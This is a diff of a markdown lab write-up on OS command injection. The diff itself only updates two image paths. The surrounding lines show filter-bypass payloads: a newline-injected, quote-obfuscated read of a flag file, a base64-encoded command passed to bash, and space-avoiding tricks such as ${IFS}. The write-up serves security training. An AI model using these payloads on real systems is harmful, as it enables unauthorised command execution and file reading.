@@ -122,13 +122,13 @@ Payload: `%0a{c'a't,${PATH:0:1}home${PATH:0:1}1nj3c70r${PATH:0:1}flag.txt}`
 
 Using Base64 encoding to bypass filters:
 
-![](Pasted%20image%2020220608163429.png)
+![](./attachments/Pasted%20image%2020220608163429.png)
 
 To make the payload useful, all we need to do is bypass the space. This can de done with `${IFS}`, `%09` or `{`x`,`x`}`.
 
 Payload: `%0abash<<<$({base64,-'d'}<<<ZmluZCAvdXNyL3NoYXJlLyB8IGdyZXAgcm9vdCB8IGdyZXAgbXlzcWwgfCB0YWlsIC1uIDE=)`
 
-![](Pasted%20image%2020220608163841.png)
+![](./attachments/Pasted%20image%2020220608163841.png)
 
 **Answer:** `/usr/share/mysql/debian_create_root_user.sql`
 
